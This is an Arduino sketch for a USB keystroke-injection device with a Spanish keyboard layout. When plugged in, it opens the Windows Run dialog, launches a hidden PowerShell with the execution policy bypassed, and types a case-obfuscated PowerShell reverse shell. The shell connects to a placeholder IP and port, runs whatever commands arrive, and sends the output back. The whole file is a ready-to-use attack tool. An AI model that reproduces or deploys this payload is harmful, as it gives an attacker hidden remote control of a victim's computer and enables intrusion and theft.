#include "Keyboard.h"
  void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin(KeyboardLayout_es_ES);

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);
  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass");
  delay(100);
  
  typeKey(KEY_RETURN);
  delay(1500);
  
  Keyboard.print("$c=nEw-oBjECt SYstEm.NEt.SOcKEts.TCPClIEnt(\"IP\",PORT);$s=$c.GetSTreAm();[byte[]]$b=0..65535|%{0};whILe(($i=$");
  delay(100);
  
  Keyboard.print("s.REad($b,0,$b.LeNgTh))-ne 0){;$d=(NEw-OBjeCT -TYpeNamE sYsTeM.TeXt.ASCIIEncoding).GetStRIng($b,0,$i);$z=(ieX $d 2>&1|oU");
  delay(100);
  
  Keyboard.print("t-STriNG);$x=$z+\"RD \"+(pwd)+\"#\";$y=([text.encoding]::ASCII).GEtByTEs($x);$s.WrIte($y,0,$y.LEnGTh);$s.FlUSh()};$c.CloSE()");
  delay(100);
  
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}

